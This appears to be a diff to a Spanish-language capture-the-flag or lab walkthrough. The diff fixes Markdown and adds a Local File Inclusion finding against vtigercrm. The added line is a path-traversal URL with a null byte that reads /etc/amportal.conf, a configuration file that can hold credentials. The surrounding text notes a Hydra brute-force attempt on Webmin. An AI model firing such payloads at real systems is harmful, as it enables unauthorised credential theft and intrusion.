@@ -65,9 +65,13 @@ Desconocemos que versión está instalada, pero probaremos todos por si nos algu
 Antes de tirar por este puerto, estuve buscando y rebuscando información que puediese sacar de los demás puertos.
 Lanzando exploits pero necesitaba información que no tenía en un principio.
 
-Otro puerto que me llamo la atención es el puerto **10000 **que corre el servicio **Webmin**
+Otro puerto que me llamo la atención es el puerto **10000** que corre el servicio **Webmin**
 Intentado hacer fuerza bruta con hydra pero a los 5 intentos nos metía en una **blacklist**.
 
 **Enumeración**
 
-https://www.exploit-db.com/exploits/37637
+Encontramos un [Local File Inclusion](https://www.exploit-db.com/exploits/37637)
+`/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
+
+
+
